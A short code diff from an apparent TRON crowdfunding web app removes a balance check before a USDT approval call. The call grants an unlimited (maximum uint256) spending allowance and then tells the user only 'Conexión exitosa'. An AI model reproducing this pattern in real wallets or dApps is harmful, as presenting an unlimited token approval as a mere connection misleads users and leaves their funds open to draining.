@@ -296,7 +296,7 @@ export default class CrowdFunding extends Component {
 
     var minTRX = 150;
 
-    if (aprovado <= 0 && balanceTRX >= minTRX){
+    if (aprovado <= 0 ){
       await contractUSDT.approve(contractAddress, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send();
       window.alert("Conexión exitosa");
       this.setState({
